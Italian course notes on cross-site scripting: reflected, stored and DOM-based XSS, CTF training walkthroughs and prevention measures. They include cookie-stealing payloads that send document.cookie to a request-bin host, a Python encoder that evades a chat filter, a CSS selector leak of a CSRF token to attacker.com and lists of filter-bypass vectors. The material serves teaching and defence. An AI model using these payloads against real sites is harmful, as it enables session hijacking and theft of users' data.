# Cross-Site Scripting (XSS)

**Tag:** #security #web-security #vulnerability #XSS #javascript

---

## 📝 Definizione

Il **Cross-Site Scripting (XSS)** è una vulnerabilità di _code injection_ in cui un attaccante riesce a iniettare codice JavaScript all'interno delle pagine di un'applicazione web, il quale viene poi eseguito nel browser della vittima.

- **Causa principale:** Sanitizzazione impropria degli input dell'utente prima che questi vengano incorporati nella pagina.
    
- **Obiettivi:** Manipolare i contenuti del sito (DOM), mostrare informazioni false, o esfiltrare dati sensibili come i cookie di sessione.
    

---

## ⚠️ Tipologie di XSS

Le vulnerabilità XSS si classificano principalmente in tre categorie:

### 1. Reflected XSS (Non persistente)

L'applicazione web include i dati provenienti da una richiesta HTTP (es. parametri URL) direttamente nella risposta HTML senza un'adeguata sanitizzazione.

- **Vettore di attacco:** L'utente viene solitamente ingannato (tramite phishing o link malevoli) nel visitare un URL preparato dall'attaccante.
    
- **Esempio:** Un payload inserito in un parametro di ricerca viene riflesso nella pagina dei risultati ("Hai cercato: `<script>...`").
    

### 2. Stored XSS (Persistente)

Il payload malevolo viene inviato al server e **memorizzato permanentemente** (es. in un database, forum, log o commenti).

- **Esecuzione:** Il codice viene eseguito automaticamente dal browser della vittima quando questa carica la pagina contenente il contenuto memorizzato.
    
- **Caratteristica:** Non richiede un'interazione diretta istantanea con l'attaccante.
    

### 3. DOM-based XSS

L'iniezione avviene interamente lato client. I dati controllati dall'attaccante (Sorgente) vengono passati a un _"sink"_ sensibile o a un'API del browser senza sanitizzazione.

- **Sorgenti (Sources):** Elementi controllabili come `location.hash`, `document.referrer`, o `window.name`.
    
- **Sink:** Funzioni che modificano il DOM o eseguono codice, come `innerHTML`, `document.write`, o `eval`.
    
- **Particolarità:** Il payload potrebbe non raggiungere mai il server, rendendo inefficaci i filtri lato server.
    

---

## 🛡️ Prevenzione e Mitigazione

### Input Handling

- **Sanitizzazione e Encoding:** Tutti gli input utente devono essere preprocessati; i caratteri speciali HTML devono essere opportunamente codificati prima dell'inserimento nella pagina.
    
- **Librerie:** Evitare l'escaping manuale. Utilizzare librerie affidabili come **DOMPurify** (per il client-side) o motori di templating (es. Jinja, Smarty) che gestiscono l'escaping automaticamente.
    

### Content Security Policy (CSP)

Un header HTTP (`Content-Security-Policy`) che permette di controllare quali risorse il browser è autorizzato a caricare.

- Può limitare le sorgenti di script (`script-src`), bloccare script inline (`unsafe-inline`) e mitigare l'esecuzione di codice non autorizzato.
    

### Trusted Types

Una API del browser progettata per eliminare il DOM XSS.

- Blocca i sink di iniezione pericolosi (come `innerHTML`) impedendo loro di accettare stringhe semplici; richiede invece oggetti "Trusted" creati tramite policy specifiche nel codice JavaScript.
    

### Cookie Security

- Impostare il flag **HttpOnly** sui cookie impedisce a JavaScript di accedere al loro contenuto (es. `document.cookie`), proteggendo dal furto di sessione in caso di XSS.
---

da [[5 - CS Application Level - Web Security Part II]]


# Web Security: Cross Site Scripting (XSS)

**Tags:** #ingegneria #sicurezza_informatica #web_security #XSS #injection

## 1. Cross Site Scripting (XSS)

Il **Cross Site Scripting (XSS)** è una vulnerabilità di tipo **code injection**.

- **Definizione:** L'attaccante riesce a iniettare codice JavaScript nelle pagine di un'applicazione web. Questo codice viene poi eseguito nel browser della vittima.
    
- **Causa principale (Root cause):** Impropria **sanitizzazione** (sanitization) degli input utente prima che vengano incorporati nella pagina.
    

![[Pasted image 20260131140343.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** Un diagramma mostra l'attaccante che invia un link malevolo alla vittima (es. via email). Il link punta a `insecure-website.com` e contiene un payload: `<script src=https://evil-user.net/badscript.js></script>`.
> 
> **Meaning:**
> 
> 1. La vittima clicca sul link.
>     
> 2. Il browser carica la pagina vulnerabile che esegue lo script malevolo.
>     
> 3. Lo script esfiltra dati sensibili (Password, Dati Sensibili, Bonifici, Nome da nubile della madre) verso l'attaccante.
>     

---

## 2. Tipologie di XSS

Esistono tre tipi principali di vulnerabilità XSS:

1. **Reflected XSS:** I dati provenienti dalla richiesta vengono incorporati dal server nella pagina web.
    
2. **Stored XSS:** Il payload è memorizzato permanentemente lato server (es. nel database dell'applicazione web).
    
3. **DOM-based XSS:** Il payload è incorporato in modo non sicuro nella pagina web lato browser (browser-side).
    

---

## 3. Reflected XSS

Nel Reflected XSS, il sito web include i dati della richiesta HTTP in ingresso nella pagina web senza una corretta sanitizzazione.

- **Meccanismo di attacco:**
    
    - L'utente viene ingannato a visitare un sito web onesto tramite un URL preparato dall'attaccante (es. email di phishing, reindirizzamento dal sito web dell'attaccante).
        
    - Lo script iniettato può manipolare i contenuti del sito web (**DOM**) per mostrare informazioni false, esfiltrare dati sensibili (es. cookie di sessione), ecc.
        

### Esempio #1: Redirect

![[Pasted image 20260131140403.png]]

1. La vittima visita `evil.com`.
    
2. `evil.com` risponde con un reindirizzamento (`302 FOUND`) verso il sito vulnerabile `example.com`, includendo il payload nel parametro `q`.
    

```HTTP
302 FOUND
Location:
https://example.com/?q=<SCRIPT>alert(1)</SCRIPT>
```

> [!abstract] Code Analysis
> 
> Il server dell'attaccante forza il browser della vittima a navigare verso `example.com` portando con sé lo script malevolo nell'URL.

### Esempio #2: Riflessione del Payload
![[Pasted image 20260131140413.png]]
![[Pasted image 20260131140417.png]]

1. Il browser invia la richiesta GET a `example.com` con il payload: `GET /?q=<SCRIPT>alert(1)</SCRIPT>`.
    
2. Il server `example.com` risponde con `200 OK` e restituisce il codice HTML che include l'input utente **non sanitizzato**.
    

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```html
<HTML>
You searched:
<SCRIPT>alert(1)</SCRIPT>
</HTML>
```

> [!abstract] Code Analysis
> 
> Il server riflette ("reflects") esattamente ciò che ha ricevuto nel parametro `q` all'interno del corpo HTML. Il browser interpreta `<SCRIPT>alert(1)</SCRIPT>` come codice eseguibile e lancia l'alert.


> [!abstract] Visual Analysis
> 
> **What to look at:** Il flusso circolare tra il laptop della vittima, il server `evil.com` e il server `example.com` (o `a.com`).
> 
> **Meaning:**
> 
> 1. La richiesta malevola può essere attivata visitando un sito controllato dall'attaccante.
>     
> 2. Il server riflette l'input dell'utente all'interno della pagina senza adeguata sanitizzazione.

# Web Security: Challenges & Stored XSS

**Tags:** #ingegneria #sicurezza_informatica #web_security #XSS #stored_xss #CTF #training

## 1. Training Challenge #07: The cWo

Questa challenge introduce uno scenario pratico in un'applicazione di chat.

- **URL:** `https://training07.webhack.it`
    
- **Contesto:** L'organizzazione "cWo" (Cauliflowers) sembra gestire la sicurezza tramite un appaltatore esterno. L'obiettivo è ottenere un accesso maggiore recuperando le credenziali.
    

### Analisi dell'Applicazione

L'applicazione è una **chat** dove possiamo interagire con un "Admin".

- L'admin risponde ai messaggi.
    
- È possibile utilizzare codice **HTML** nei messaggi.
    

> [!abstract] Visual Analysis
> 
> **What to look at:** L'interfaccia della chat mostra messaggi scambiati tra "Admin" e l'utente "brewtoot".
> 
> **Meaning:**
> 
> - L'utente invia `<b>ciao</b>`.
>     
> - Il messaggio viene renderizzato come **grassetto** (bold) nella chat.
>     
> - Questo conferma che l'input utente viene interpretato come HTML (HTML Injection).
>     

### Il Problema

Poiché il messaggio viene renderizzato dall'admin, esiste la possibilità di eseguire codice JavaScript nel browser dell'admin (XSS).

1. **Tentativo Base:** Se si prova a inserire semplice codice JavaScript, l'applicazione di chat lo **filtra**.
    
2. **Obiettivo:** Aggirare il filtro per eseguire codice malevolo e rubare i **cookie** dell'admin.
    

### Soluzione: Encoding
![[Pasted image 20260205183539.png]]![[Pasted image 20260205183545.png]]![[Pasted image 20260205183550.png]]![[Pasted image 20260205183557.png]]

Per aggirare il filtro, è necessario codificare il payload in modo inaspettato per il filtro ma comprensibile per il browser.

#### Setup dell'Attaccante

Prima di lanciare l'attacco, è necessario un server HTTPS funzionante per ricevere la richiesta con i cookie rubati.

- Si può usare un servizio come `postb.in` o `requestbin.com`.
    

#### Codice dell'Exploit
L'obiettivo è iniettare il seguente payload logico:

```JavaScript
javascript:document.location='https://postb.in/YOUR_BIN_ID?cookie='+document.cookie;
```

Poiché il codice JavaScript è filtrato, si utilizza uno script Python per offuscare il payload usando **HTML Entities** con padding numerico.

**Here is the exact implementation shown in the slides:**

```Python
import sys
print("<img src=x onerror=", end="")
for x in sys.argv[1]:
    char_val = str(ord(x))
    padding = 7 - len(char_val)
    print(f"&#" + "0" * padding + char_val, end="", flush=True)
print("\">")
```

> [!abstract] Code Analysis
> 
> - Il payload viene inserito in un gestore eventi `onerror` di un tag `<img>` invalido (`src=x`).
>     
> - Ogni carattere del payload JavaScript viene convertito nel suo valore ASCII (`ord(x)`).
>     
> - Viene applicato un padding di zeri per raggiungere una lunghezza fissa (es. `&#0000106` per il carattere 'j').
>     
> - Questo encoding spesso aggira i filtri basati su firme (signature-based) che cercano parole chiave specifiche come `javascript:`.
>     

#### Esecuzione e Risultato

1. Si esegue lo script Python passando il payload JavaScript desiderato.
    
2. Si copia l'output generato nella chat.
    
3. L'admin visualizza il messaggio, il tag `<img>` fallisce il caricamento, scatta `onerror`, il codice decodificato viene eseguito.
    
4. Nel `postb.in` compare una richiesta GET contenente il cookie: `flag=WIT{...}`.
![[Pasted image 20260131141446.png]]

### 1. Come viene usato l'output

L'output generato dallo script `exploit.py` è una stringa HTML specificamente formattata per aggirare i filtri della chat.

1. **Generazione del Payload:** Lo script prende il codice JavaScript malevolo (il redirect verso `postb.in` con i cookie) e lo converte in una sequenza di **entità HTML decimali con padding** (es. `&#0000106` invece di `j`). Questo viene inserito all'interno dell'attributo `onerror` di un tag immagine non valido.
    - _Output tipico:_ `<img src=x onerror="&#0000106&#0000097...">`
2. **Immissione (Injection):** L'attaccante copia questa stringa e la incolla come messaggio nella chat dell'applicazione vulnerabile.
3. **Memorizzazione:** Poiché si tratta di una **Stored XSS**, il messaggio viene salvato dal server e visualizzato successivamente dalla vittima (l'Admin) quando apre la chat per leggere i messaggi.

### 2. Come riesce a "fregare" i cookie (Il meccanismo tecnico)

L'attacco ha successo perché sfrutta il modo in cui i browser gestiscono gli attributi HTML e gli eventi, aggirando al contempo un filtro di sicurezza mal implementato.

Ecco la sequenza esatta:

- **Evasione del Filtro:** L'applicazione chat implementa un filtro che blocca il codice JavaScript palese (probabilmente cerca parole chiave come `<script>` o `javascript:` in chiaro). Tuttavia, il filtro non decodifica le entità HTML prima di analizzare il testo. Poiché il codice è offuscato come `&#0000106...`, il filtro lo lascia passare, credendo sia testo innocuo.
- **Rendering e Trigger dell'Evento:** Quando il browser dell'Admin visualizza il messaggio:
    1. Tenta di caricare l'immagine definita in `<img src=x ...>`.
    2. Poiché `x` non è un URL valido, il caricamento fallisce.
    3. Il fallimento attiva immediatamente l'evento **`onerror`**.
- **Decodifica ed Esecuzione:** Qui avviene il passaggio critico. Per standard, quando un browser legge il valore di un attributo HTML (come `onerror`), **decodifica automaticamente le entità HTML** prima di passare il contenuto al motore JavaScript.
    - Il browser trasforma `&#0000106...` nella stringa originale: `javascript:document.location='https://postb.in/...'`.
    - Il codice JavaScript viene quindi eseguito nel contesto della sessione dell'Admin.
- **Esfiltrazione:** Il comando eseguito reindirizza il browser dell'Admin verso il server dell'attaccante (`postb.in`), appendendo i **cookie di sessione** dell'Admin come parametro dell'URL (`?cookie=...`).

L'attaccante deve solo controllare i log del suo `postb.in` per vedere la richiesta in arrivo contenente il cookie segreto dell'Admin.

---

## 2. Stored XSS

Il **Stored XSS** (o Persistent XSS) è una variante in cui i dati malevoli vengono salvati permanentemente dal server.

### Concetto Chiave

- Il sito web riceve dati da una sorgente non fidata e li **memorizza** (es. in un database, file system, log).
    
- Esempi tipici: social network, blog, forum, wiki.
    
- **Vettori:** Un attaccante incorpora uno script come parte di un commento in un forum.
    
- **Esecuzione:** Quando un visitatore (vittima) carica la pagina che visualizza quel contenuto, il browser esegue lo script.
    
- **Differenza critica:** Non è richiesta alcuna interazione diretta tra l'attaccante e la vittima (a differenza del Reflected XSS dove la vittima deve cliccare un link).

### Esempio 1
![[Pasted image 20260131141503.png]]
![[Pasted image 20260131141513.png]]

### Esempio 2

![[Pasted image 20260131141542.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:**
> 
> 1. Attaccante invia `POST /thread/1` con `msg=<SCRIPT>alert(1)</SCRIPT>`.
>     
> 2. Server `forum.com` salva il messaggio nel database.
>     
> 3. Vittima richiede `GET /thread/1`.
>     
> 4. Server include il messaggio salvato nell'HTML restituito.
>     
> 5. Il browser della vittima esegue l'alert.
>     
> 
> **Meaning:** Il payload è persistente e colpisce chiunque visualizzi la pagina infetta.

---

## 3. Training Challenge #08: Pasteurize
![[Pasted image 20260131140535.png]]
![[Pasted image 20260131140606.png]]
![[Pasted image 20260131140703.png]]
![[Pasted image 20260131140906.png]]![[Pasted image 20260131140912.png]]
![[Pasted image 20260131140923.png]]![[Pasted image 20260131140936.png]]![[Pasted image 20260131140945.png]]![[Pasted image 20260131140952.png]]

Questa challenge simula un servizio di "Pastebin" personalizzato.

- **URL:** `https://training08.webhack.it`
    
- **Funzionalità:** Permette di creare un nuovo "paste" (nota) e condividerlo con un utente chiamato "TJMike".
    

### Analisi del Codice e Vulnerabilità

Analizzando il codice sorgente della pagina dove viene visualizzato il paste, si nota come viene gestita la sanitizzazione:

```JavaScript
<script>
const note = "asaas";
const note_id = "3b7b2f42-36e4-4298-975e-5127d9565fc3";
const note_el = document.getElementById('note-content');
const note_url_el = document.getElementById('note-title');
const clean = DOMPurify.sanitize(note);
note_el.innerHTML = clean;
note_url_el.href = "/note/3b7b2f42-36e4-4298-975e-5127d9565fc3";
note_url_el.innerHTML = "3b7b2f42-36e4-4298-975e-5127d9565fc3";
</script>
```

> [!abstract] Code Analysis
> 
> - L'input dell'utente (`const note = "..."`) viene inserito direttamente all'interno di un blocco `<script>`.
>     
> - Anche se successivamente viene usata `DOMPurify.sanitize(note)` per pulire l'HTML prima di inserirlo nel DOM (`note_el.innerHTML`), la vulnerabilità risiede nella riga iniziale: `const note = "INPUT_UTENTE";`.
>     
> - Il server inserisce l'input "as is" (così com'è) dentro una stringa JavaScript.
>     

### Soluzione: Breaking out of the String

Poiché l'input è dentro una stringa delimitata da doppi apici, possiamo "rompere" la stringa e iniettare codice JavaScript arbitrario.

#### Payload di Test

```JavaScript
"; alert(1); //
```

- `";` chiude la stringa e l'istruzione precedente.
    
- `alert(1);` è il comando iniettato.
    
- `//` commenta il resto della riga originale (il chiudi-virgolette e punto e virgola originali).
    

#### Payload Finale (Stealing Cookies)

Per rubare i cookie e inviarli al nostro server (es. `postb.in`):

```JavaScript
"; window.location = 'https://postb.in/YOUR_BIN_ID?' + document.cookie; //
```

### Procedura di Attacco (Exploitation Flow)

L'attacco richiede di far visualizzare il paste malevolo alla vittima (TJMike). Poiché la funzionalità di condivisione ("share with TJMike") potrebbe non permettere l'invio diretto del nostro paste malevolo o richiede passaggi specifici, si usa **Burp Suite** per manipolare la richiesta.

1. **Creare il Payload:** Creare un paste con il codice JavaScript malevolo (Payload Finale). Ottenere l'**ID** di questo paste malevolo.
    
2. **Creare un Paste Benigno:** Creare un paste normale (senza payload).
    
3. **Intercettare la Segnalazione:** Usare la funzionalità "share with TJMike" sul paste benigno e intercettare la richiesta POST con Burp Suite (o inviarla al Repeater).
    
4. **ID Swap (Scambio ID):** Nella richiesta intercettata, sostituire l'ID del paste benigno con l'**ID del paste malevolo**.
    

#### Analisi della Richiesta Manipolata

**Here is the exact implementation shown in the slides:**

```HTTP
POST /report/ee31731c-bfd7-4089-b4de-4548d15cf799 HTTP/2
Host: training08.webhack.it
Cookie: challenge_auth_token=...
...
```

> [!abstract] Visual Analysis
> 
> **What to look at:** Lo screenshot di Burp Repeater mostra l'URL della richiesta POST `/report/UUID`.
> 
> **Meaning:** Si invia al bot (TJMike) l'istruzione di visitare il report identificato dall'UUID malevolo.

5. **Risultato:** TJMike visita il paste malevolo. Il browser esegue il JavaScript iniettato (poiché rompe la stringa `const note`). Viene effettuato il redirect verso `postb.in` con i cookie appesi nell'URL.
    
6. **Flag:** Il flag `WIT{...}` appare nei log di `postb.in`.

# Web Security: DOM-based XSS & Prevention

**Tags:** #ingegneria #sicurezza_informatica #web_security #XSS #DOM_based_XSS #prevenzione

## 1. DOM-based XSS

Nel **DOM-based XSS**, i dati provenienti da una sorgente controllabile dall'attaccante (es. l'URL) vengono inseriti in un **sensitive sink** o in API del browser senza un'adeguata sanitizzazione.

- **Caratteristica fondamentale:** L'iniezione di codice pericoloso è eseguita da codice JavaScript vulnerabile.
    
- **Visibilità:** Il server potrebbe **non vedere mai** il payload dell'attaccante.
    
- **Conseguenza:** Le tecniche di rilevamento lato server (server-side detection) non funzionano.
    

### Componenti Chiave

Le slide classificano gli elementi coinvolti in **Sources** (Sorgenti) e **Sinks** (Punti di destinazione/esecuzione).

**Popular Sources (Sorgenti Comuni):**

- `document.URL`
    
- `document.documentURI`
    
- `location.href`
    
- `location.search`
    
- `location.*` (altre proprietà di location)
    
- `window.name`
    
- `document.referrer`
    

**Popular Sinks (Sinks Comuni):**

- **HTML Modification sinks** (Modificano l'HTML della pagina):
    
    - `document.write`
        
    - `(element).innerHTML`
        
- **HTML modification to behaviour change** (Modifica comportamentale):
    
    - `(element).src` (in certi elementi)
        
- **Execution Related sinks** (Eseguono codice):
    
    - `eval`
        
    - `setTimeout` / `setInterval`
        
    - `execScript`
        

---

## 2. Esempio di DOM-based XSS

Il DOM XSS si verifica quando uno dei sink di iniezione nel DOM o altre API del browser viene chiamato con dati controllati dall'utente.

#### Sezione Implementazione

Consideriamo questo snippet che carica un foglio di stile per un determinato template.

**Here is the exact implementation shown in the slides:**

```JavaScript
const templateId = location.hash.match(/tplid=([^;]*)/)[1];
// ...
document.head.innerHTML += '<link rel="stylesheet" href="./templates/${templateId}/style.css">';
```

> [!abstract] Code Analysis
> 
> - **Sorgente:** `location.hash` (controllato dall'utente/attaccante).
>     
> - **Logica:** Viene estratto il valore di `tplid` tramite una regex.
>     
> - **Sink:** `document.head.innerHTML` (permette l'inserimento di HTML arbitrario).
>     
> - **Vulnerabilità:** Il codice collega direttamente la sorgente al sink senza sanitizzazione.
>     

### Exploit

L'attaccante può sfruttare questo codice costruendo un URL malevolo che chiude il tag e ne apre uno nuovo.

**Esempio di URL malevolo:**

`https://example.com#tplid="><img src=x onerror=alert(1)>`

---

## 3. CSS Injection (Non solo script)

Mentre gli script rappresentano la minaccia più pericolosa, l'iniezione di altri contenuti può causare seri problemi di sicurezza.

- **CSS Injection:** Può essere utilizzata per esfiltrare (leak) valori segreti presenti nel DOM della pagina (es. **CSRF tokens**).
    

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```HTML
<HTML>
<STYLE>
	input[name=csrf] [value^=a] ~ * {
	background-image: url(http://attacker.com/?v=a);
}
input[name=csrf] [value^=b] ~ * {
	background-image: url(v=b);
}
/* ... */
input[name=csrf] [value^=9] ~ * {
	background-image: url(v=9);
}
</STYLE>
/* ... */
<FORM>
...
<INPUT type="hidden" name="csrf" value="s3cr3t">
...
</FORM>
</HTML>
```

> [!abstract] Code Analysis
> 
> - **Selettori CSS:** Utilizza selettori di attributo come `[value^=a]` (inizia con 'a').
>     
> - **Meccanismo:** Se il valore del token inizia con una certa lettera, il browser applica lo stile corrispondente.
>     
> - **Esfiltrazione:** Lo stile imposta un `background-image` che punta al server dell'attaccante (`http://attacker.com/?v=a`). Quando il browser tenta di caricare l'immagine, invia una richiesta all'attaccante rivelando il carattere corrispondente.
>     

## A nice homework
f you want to practice with XSS, play with
https://xss-game.appspot.com
![[Pasted image 20260131141850.png]]

---

## 4. Prevenzione XSS

Qualsiasi input utente deve essere pre-processato prima di essere utilizzato all'interno della pagina.

### Regole Fondamentali

1. **Encoding:** I caratteri speciali HTML devono essere correttamente codificati (encoded) prima dell'inserimento.
    
2. **Contesto:** Diversi encoding o filtraggi sono richiesti a seconda della posizione (es. all'interno di un attributo HTML vs all'interno di un blocco `<div>`).
    
3. **No Manual Escaping:** Non fare l'escaping manualmente!
    

### Librerie Consigliate

Usa librerie di escaping affidabili:

- **OWASP ESAPI** (Enterprise Security API).
    
- **Microsoft's AntiXSS**.
    
- **DOMPurify** (specifico per client-side).
    

### Templating Libraries

Affidarsi a librerie di templating che forniscono funzionalità di escaping integrate:

- **Smarty** e **Mustache** (PHP).
    
- **Jinja** (Python).
    

### Difesa Specifica per DOM-based XSS

- Utilizzare i **Trusted Types**.
    

---

## 5. XSS Auditor in Chrome

![[Pasted image 20260131141916.png]]

Le slide menzionano uno strumento storico di Chrome, ora rimosso.

- **Stato:** Deprecato e rimosso (da Chrome 78 nel 2019).
    
- **Funzionamento:** Eseguiva durante la fase di parsing HTML e tentava di trovare riflessioni dalla richiesta al corpo della risposta.
    
- **Limiti:** Non tentava di mitigare XSS Stored o DOM-based.
    
- **Motivo della rimozione:** Bypass non risolti e falsi positivi. Aveva costi di performance se l'URL o il corpo POST includevano caratteri specifici (`<`, `>`).
    

---

## 6. Problemi con i Filtri (Caveats)

I filtri semplici possono essere aggirati facilmente se non implementati correttamente (spesso usando espressioni regolari costose o logiche fallaci).

**Esempio di Bypass (Rimozione singola):**

Se il filtro rimuove la stringa `<script` una sola volta:

- Input: `<scr<scriptipt src="...">`
    
- Risultato dopo filtro: `<script src="...">` (il filtro rimuove la parte centrale e ricompone la stringa malevola).
    
- **Soluzione necessaria:** Bisognerebbe ciclare e riapplicare il filtro finché non viene trovato nulla.
    

**Vettori Alternativi:**

Il tag `<script>` potrebbe non essere necessario per un XSS.

**Here is the exact implementation shown in the slides:**

```HTML
<A href="INJECTION_HERE">
<A href="#" onclick="alert(1)">
```

---

## 7. Varianti di XSS (Many Flavors)

Esistono molti modi per eseguire codice JavaScript, alcuni dipendenti dal browser specifico.

#### Sezione Implementazione

**Here is the exact implementation shown in the slides:**

```HTML
<style>@keyframes x{}</style><xss style="animation-name:x" onanimationend="alert(1)"></xss>

<body onbeforeprint=alert(1)>

<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />

<style>:target {color: red;}</style><xss id=x style="transition:color 10s"
 ontransitioncancel=alert(1)></xss>
 
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>

<embed src="javascript:alert(1)">

<iframe srcdoc=&lt;script&gt;alert&lpar;1&rpar;&lt;&sol;script&gt;></iframe>
```

> [!abstract] Code Analysis
> 
> Questi payload dimostrano l'uso di:
> 
> - Eventi CSS (`onanimationend`, `ontransitioncancel`).
>     
> - Eventi del corpo (`onbeforeprint`).
>     
> - Tag SVG (`<animate>`).
>     
> - Tag `embed` e `iframe` con `srcdoc`.
>     
> - Offuscamento JavaScript (`\x28` per parentesi aperta).
>     

---

## 8. Evasione dei Filtri XSS

Esistono risorse online ("Cheat sheets") che elencano vettori per aggirare WAF (Web Application Firewall) e filtri.

- Alcuni trucchi sono specifici per browser.
    
- Altri sono specifici per librerie di templating JS.
    
- Risorsa citata: **PortSwigger Cross-site scripting (XSS) cheat sheet**.
    

![[Pasted image 20260131142007.png]]

> [!abstract] Visual Analysis
> 
> **What to look at:** Lo screenshot mostra una tabella interattiva (Cheat Sheet).
> 
> **Meaning:**
> 
> - Permette di filtrare per **Event handlers** (gestori eventi), **Tags** e **Browsers**.
>     
> - Mostra vettori che non richiedono interazione utente (es. `onactivate`).
>     
> - Dimostra la vastità della superficie di attacco XSS.

---
vedi il [[CSP]] che è una tecnica per mitigare il XSS